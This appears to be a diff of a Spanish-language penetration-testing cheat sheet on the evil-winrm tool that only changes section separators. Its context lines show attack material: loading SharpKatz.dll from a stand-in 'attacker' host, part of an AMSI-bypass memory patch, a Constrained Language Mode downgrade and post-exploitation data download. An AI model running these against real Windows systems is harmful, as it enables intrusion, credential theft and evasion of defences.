@@ -24,7 +24,7 @@ linked:
 ---
 # evil-winrm
 
-***
+---
 
 ## Overview
 
@@ -34,7 +34,7 @@ Install: `gem install evil-winrm` / `apt install evil-winrm` / `docker run --rm 
 
 > Regla: AMSI + Constrained Language Mode (CLM) bloquean scripts invasivos. Evil-WinRM trae flags de bypass (`-o -c`) que funcionan en defaults.
 
-***
+---
 
 ## Conexión
 
@@ -57,7 +57,7 @@ evil-winrm -i <target> -u <user> -p <pass> -S -c cert.pem -k key.pem
 evil-winrm -i <target> -P 5985 -u U -p P
 ```
 
-***
+---
 
 ## Flags útiles
 
@@ -72,7 +72,7 @@ evil-winrm -i <target> -P 5985 -u U -p P
 | `-V` | Verbose |
 | `-t <sec>` | Connection timeout |
 
-***
+---
 
 ## Comandos built-in (en prompt)
 
@@ -110,7 +110,7 @@ Invoke-Binary                             # alias
 *Evil-WinRM* PS C:\> Dll-Loader -http -url http://attacker/SharpKatz.dll
 ```
 
-***
+---
 
 ## AMSI bypass
 
@@ -129,7 +129,7 @@ $g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);
 [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
 ```
 
-***
+---
 
 ## CLM bypass
 
@@ -143,7 +143,7 @@ powershell.exe -version 2
 
 Otras técnicas: GhostPack binaries (via `Invoke-Binary`), JEA endpoint abuse, BYOVD.
 
-***
+---
 
 ## Post-exploitation quick wins
 
@@ -171,7 +171,7 @@ Get-ChildItem -Path HKLM:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | Sele
 *Evil-WinRM* PS C:\> download bh.zip /tmp/
 ```
 
-***
+---
 
 ## Troubleshooting
 
@@ -184,7 +184,7 @@ Get-ChildItem -Path HKLM:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | Sele
 | Timeout en `Bypass-4MSI` | Nueva versión de AMSI | bypass manual custom |
 | `Couldn't find Client Certificate` | cert path mal | `-c /full/path.pem -k /full/key.pem` |
 
-***
+---
 
 ## Alternativas
 
@@ -192,7 +192,7 @@ Get-ChildItem -Path HKLM:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | Sele
 - **impacket-wmiexec** → si WinRM cerrado y SMB abierto.
 - **PowerShell Remoting nativo** (desde Windows attacker): `Enter-PSSession -ComputerName <t> -Credential <c>`.
 
-***
+---
 
 ## Referencias
 
